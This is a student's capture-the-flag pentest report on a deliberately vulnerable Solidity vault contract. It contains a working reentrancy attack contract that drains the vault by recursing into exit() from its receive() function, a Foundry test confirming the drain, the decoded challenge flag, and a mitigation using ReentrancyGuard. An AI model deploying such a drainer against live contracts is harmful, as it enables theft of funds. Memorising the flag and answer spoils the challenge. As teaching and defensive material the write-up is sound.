# Pentest Report for Reentracy.sol

> Author: Tran Thanh Minh
> 

<aside>
🏦

The `AssetVault` contract allows users to deposit and withdraw funds, with certain events triggered based on specific conditions. The report identifies a potential vulnerability that could be exploited to manipulate event emissions and potentially gain unauthorized access to information.

</aside>

# Table of contents

---

# Vulnerability

With the tool `slither`, it help to identify the vulnerability in the `reentracy.sol` quickly and accurate. 

![`slither` identify vulnerability in contract `AssetVault`](image.png)

`slither` identify vulnerability in contract `AssetVault`

It suffer from one of [the OWASP Smart Contract Top 10](https://owasp.org/www-project-smart-contract-top-10/) which is Reentrancy Attacks. Based on the above image, in the `exit` function, the `call` operation transfers Ether to the user before deducting their balance, which can cause malicious contracts can repeatedly call `exit` before the `_credits[msg.sender]` is updated

# Exploit Development

First, need to create `Attack` contract with the reference to the vulnerable `AssetVault` contract, it will act as a malicious contract that performs recursive calls to the `exit` function to exploit the reentrancy vulnerability. 

```solidity
contract Attack {
    AssetVault public vault; // Reference to the vulnerable AssetVault
    constructor(address _vault) {
        vault = AssetVault(_vault);
    }
    function attackDeposit() public payable {
        vault.enter{value: msg.value}(); // Deposits Ether into the vault
    }
    function attackWithdraw(uint256 _amount) public {
        vault.exit(_amount); // Initiates withdrawal to trigger reentrancy
    }
    receive() external payable {
        if (address(vault).balance > 0) {
            vault.exit(1 ether); // Keep calling exit until funds are drained
        }
    }
}
```

The attacker first need to deposit Ether into the vault using `enter` function, and ensures their account has sufficient credit to call the `exit` function without triggering the `Insufficient balance`  check. The exploit will begin when the attacker calls `exit` function. During this function’s execution, the Ether transfer operation triggers the `receive` fallback function in the `Attack` contract. From there, the contract recursively calls `exit` again before the `_credits` mapping is updated. 

# Explanation of Exploit

## Key vulnerability

The `exit` function in the `AssetVault` contract performs Ether transfer to the user before updating the `_credits` mapping. This allows an attacker to call the `exit` function repeatedly (reentrancy) to withdraw more funds than they deposited. 

## Exploit process

![`AssetVaultExploitTest` contract to exploit the `AssetVault` contract](0e972130-27f3-4a87-8b4c-2578fcf8c017.png)

`AssetVaultExploitTest` contract to exploit the `AssetVault` contract

From the above image, the attacker deposits 1 Ether into the vault using `attackDeposit()` which add 1 Ether to the `_cretdits` . The attacker calls `attackWithdraw()` with 1 Ether to trigger the `exit` function in the `AssetVault` . Then, the Ether transfer within `exit` function triggers the `receive` function in the `Attack` contract, this function recursively calls `exit` function again and again to withdraw another 1 Ether even though the `_credits` mapping hasn’t been updated yet until the vault’s balance is depleted or the attacker runs out of gas.

Here is the result from the command line when test: 

![Exploit the `AsssetVault` contract successfully. ](image%201.png)

Exploit the `AsssetVault` contract successfully. 

Moreover there is a hidden flag when combine 4 constants (PART1, PART2, PART3, PART4) : 

```python
def decode_bytes32(hex_str):
    bytes_obj = bytes.fromhex(hex_str)
    return bytes_obj.decode('ascii')

part1 = decode_bytes32('466c416753776900000000000000000000000000000000000000000000000000')
part2 = decode_bytes32('6e62757200000000000000000000000000000000000000000000000000000000')
part3 = decode_bytes32('6e65486900000000000000000000000000000000000000000000000000000000')
part4 = decode_bytes32('3375504300000000000000000000000000000000000000000000000000000000')

print(part1 + part2 + part3 + part4)
```

The result from the python code above is `FlAgSwinburneHi3uPC`

Formatted flag `CTF{FlAgSwinburneHi3uPC}`

# Mitigation

Below is the smart contract has been mitigated with the library `openzeppelin-contracts`: 

![`AccessVault`  contract’s vulnerability has been mitigated. ](reentrancy.png)

`AccessVault`  contract’s vulnerability has been mitigated. 

The smart contract has been reordered balance updates code to prevent reentrancy attacks. This solution ensure that all state changes are completed before interacting with external addresses. 

After mitigation, the result of the test has changed: 

![image.png](image%202.png)

Now, the attacker can’t perform reentrancy attacks. 

# Resource

`AssetVault` contract after mitigation: 

```solidity
// SPDX-License-Identifier: MIT
// Find the vuln, write the exploit POC, how to mitigate, and what is the flag
pragma solidity ^0.8.18;
import "../lib/openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol";

contract AssetVault is ReentrancyGuard {
    mapping(address => uint256) private _credits;
    mapping(address => uint8) private _sequence;

    bytes32 private constant PART1 =
        0x466c416753776900000000000000000000000000000000000000000000000000;
    bytes32 private constant PART2 =
        0x6e62757200000000000000000000000000000000000000000000000000000000;
    bytes32 private constant PART3 =
        0x6e65486900000000000000000000000000000000000000000000000000000000;
    bytes32 private constant PART4 =
        0x3375504300000000000000000000000000000000000000000000000000000000;

    event BalanceUpdate(bytes32 indexed data, uint256 indexed opcode);
    event TransferLog(bytes32 indexed data, uint256 indexed opcode);

    function enter() public payable nonReentrant {
        require(msg.value >= 0.5 ether, "Min deposit 0.5 ETH");
        _credits[msg.sender] += msg.value;

        _sequence[msg.sender] = (_sequence[msg.sender] + 1) % 5;

        if (_sequence[msg.sender] == 2) {
            emit BalanceUpdate(PART1 ^ bytes32(block.timestamp), 0xA1);
        }
        if (_sequence[msg.sender] == 3) {
            emit BalanceUpdate(PART2 ^ bytes32(block.timestamp), 0xB2);
        }
    }

    function exit(uint256 _amount) public nonReentrant {
        require(_credits[msg.sender] >= _amount, "Insufficient balance");

        // Deduct the balance **before** transferring funds
        _credits[msg.sender] -= _amount;

        uint8 currentSeq = _sequence[msg.sender];

        // Safely transfer Ether
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");

        // Log events based on updated balance and sequence
        if (currentSeq == 4 && address(this).balance <= 3 ether) {
            emit TransferLog(
                PART3 ^ bytes32(uint256(uint160(msg.sender))),
                0xC3
            );
        }
        if (address(this).balance <= 1 ether) {
            emit TransferLog(PART4 ^ bytes32(gasleft()), 0xD4);
        }
    }

    function checkBalance(address user) public view returns (uint256) {
        return _credits[user];
    }
}

```

Test case for exploit: 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/reentracy.sol";
contract AssetVaultExploitTest is Test {
    AssetVault public vault;
    Attack public attacker;

    function setUp() public {
        // Fund this test contract with Ether
        vm.deal(address(this), 10 ether);
        vault = new AssetVault();
        attacker = new Attack(address(vault));

        // Ensure the vault has sufficient balance
        vm.deal(address(vault), 10 ether);
    }
    function testReentrancyExploit() public {
        // Log initial attacker balance
        uint256 initialAttackerBalance = address(attacker).balance;
        console.log("Attacker Initial Balance: ", initialAttackerBalance);
        // Attacker deposits enough Ether to avoid revert
        attacker.attackDeposit{value: 1 ether}();
        // Check if the vault has sufficient balance before exploit
        uint256 initialVaultBalance = address(vault).balance;
        console.log("Initial Vault Balance: ", initialVaultBalance);
        // Attacker initiates reentrancy exploit
        attacker.attackWithdraw(1 ether);
        console.log("Done with reentrancy exploit");
        // Log final attacker balance
        uint256 finalAttackerBalance = address(attacker).balance;
        console.log("Attacker Final Balance: ", finalAttackerBalance);
        // Verify vault's balance after exploit
        uint256 finalVaultBalance = address(vault).balance;
        console.log("Vault Balance After Attack: ", finalVaultBalance);
        // Assert that the vault balance was drained
        assertTrue(
            finalVaultBalance < initialVaultBalance - 1 ether,
            "Vault balance should have been drained due to reentrancy"
        );
    }
    receive() external payable {} // To accept Ether from the vault
}

contract Attack {
    AssetVault public vault; // Reference to the vulnerable AssetVault
    constructor(address _vault) {
        vault = AssetVault(_vault);
    }
    function attackDeposit() public payable {
        vault.enter{value: msg.value}(); // Deposits Ether into the vault
    }
    function attackWithdraw(uint256 _amount) public {
        vault.exit(_amount); // Initiates withdrawal to trigger reentrancy
    }
    receive() external payable {
        if (address(vault).balance > 0) {
            vault.exit(1 ether); // Keep calling exit until funds are drained
        }
    }
}
```

`decrypt.py` for decrypting the flag: 

```solidity
def decode_bytes32(hex_str):
    bytes_obj = bytes.fromhex(hex_str)
    return bytes_obj.decode('ascii')

part1 = decode_bytes32('466c416753776900000000000000000000000000000000000000000000000000')
part2 = decode_bytes32('6e62757200000000000000000000000000000000000000000000000000000000')
part3 = decode_bytes32('6e65486900000000000000000000000000000000000000000000000000000000')
part4 = decode_bytes32('3375504300000000000000000000000000000000000000000000000000000000')

print(part1 + part2 + part3 + part4) // FlAgSwinburneHi3uPC

// Flag: CTF{FlAgSwinburneHi3uPC}

```